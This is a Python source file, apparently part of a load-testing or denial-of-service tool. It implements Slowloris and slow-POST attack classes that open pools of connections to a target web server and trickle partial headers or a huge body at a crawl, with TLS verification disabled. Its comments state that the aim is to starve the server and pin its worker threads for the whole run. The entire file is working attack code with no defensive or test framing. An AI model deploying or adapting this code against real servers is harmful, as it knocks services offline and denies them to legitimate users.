"""Slowloris vector: hold many connections open, dribble incomplete headers
just before the server's header timeout, never finish the request.

The resident pool is opened in background(); each pool connection gets a
keeper task that sends a "keep-alive" partial-header line every
trickle_interval seconds. run_unit() tops the pool up at the scheduled rate.
Target pressure = concurrency (cfg.connections per worker), not req/s.
"""

from __future__ import annotations

import asyncio
import time

from .base import Vector

SLOW_HEADERS = (
    b"X-a: "  # dribble lines
)
FINAL_STUB = b"X-b: 1\r\n"  # appended after trickle lines (never completed)


class Slowloris(Vector):
    name = "slowloris"
    needs_tls = True  # works over TLS too; open_connection handles both

    def __init__(self, cfg, stats, worker_id):
        super().__init__(cfg, stats, worker_id)
        self._conns = {}       # id -> (reader, writer)
        self._keepers = {}     # id -> task
        self._next_id = 0
        self._partial = (
            f"POST /{cfg.target.path.lstrip('/')} HTTP/1.1\r\n"
            f"Host: {cfg.target.host}\r\n"
            f"User-Agent: {cfg.user_agent}\r\n"
            f"Content-Length: {max(cfg.slowpost_size, 1024)}\r\n"
        ).encode()

    async def _open_one(self):
        tgt = self.cfg.target

        async def _make():
            if tgt.use_tls:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                return await asyncio.open_connection(tgt.host, tgt.port, ssl=ctx)
            return await asyncio.open_connection(tgt.host, tgt.port)

        reader, writer = await self._connect(_make, self.cfg.connect_timeout)
        writer.write(self._partial)
        await writer.drain()
        return reader, writer

    async def _keeper(self, cid: int, reader, writer):
        """Trickle partial headers; if the connection dies, drop it."""
        try:
            while not self._stopped:
                await asyncio.sleep(self.cfg.trickle_interval)
                writer.write(SLOW_HEADERS + str(cid % 10_000).encode() + b"\r\n")
                await asyncio.wait_for(writer.drain(), timeout=5.0)
        except (asyncio.CancelledError, ConnectionError, OSError, asyncio.TimeoutError):
            await self._drop(cid)
        except Exception:
            await self._drop(cid)

    async def _drop(self, cid: int):
        item = self._conns.pop(cid, None)
        task = self._keepers.pop(cid, None)
        if task:
            task.cancel()
        if item:
            _, w = item
            try:
                w.close()
            except Exception:
                pass
            self.stats.bump("connections", -1)

    async def background(self):
        # seed the pool
        target_n = max(1, self.cfg.connections // self.cfg.processes)
        for _ in range(target_n):
            try:
                r, w = await self._open_one()
            except (asyncio.TimeoutError, ConnectionError, OSError):
                self.stats.bump("connfail")
                await asyncio.sleep(0.05)
                continue
            cid = self._next_id
            self._next_id += 1
            self._conns[cid] = (r, w)
            self.stats.bump("connections")
            self._keepers[cid] = asyncio.ensure_future(self._keeper(cid, r, w))

    async def run_unit(self, t: float):
        """Top up pool: one new connection per scheduled unit."""
        if len(self._conns) >= self.cfg.max_inflight:
            return
        try:
            r, w = await self._open_one()
        except (asyncio.TimeoutError, ConnectionError, OSError):
            self.stats.bump("connfail")
            return
        cid = self._next_id
        self._next_id += 1
        self._conns[cid] = (r, w)
        self.stats.bump("connections")
        self.stats.bump("requests")
        self.stats.bump("success")
        self._keepers[cid] = asyncio.ensure_future(self._keeper(cid, r, w))

    async def aclose(self):
        self._stopped = True
        for cid in list(self._conns):
            await self._drop(cid)


class SlowPost(Slowloris):
    """Slow body sender: complete headers, then dribble a huge body at a
    crawl — pins server worker threads for the whole run."""
    name = "slowpost"

    def __init__(self, cfg, stats, worker_id):
        super().__init__(cfg, stats, worker_id)
        # terminate the header block so the server starts reading the BODY
        # (that's the resource we starve: complete request, endless body)
        self._partial = self._partial + b"\r\n"

    async def _keeper(self, cid: int, reader, writer):
        try:
            chunk = b"A" * 64
            sent = 0
            total = self.cfg.slowpost_size
            interval = max(0.05, self.cfg.trickle_interval / 100)
            while not self._stopped and sent < total:
                await asyncio.sleep(interval)
                writer.write(chunk)
                await asyncio.wait_for(writer.drain(), timeout=5.0)
                sent += len(chunk)
        except (asyncio.CancelledError, ConnectionError, OSError, asyncio.TimeoutError):
            await self._drop(cid)
        except Exception:
            await self._drop(cid)
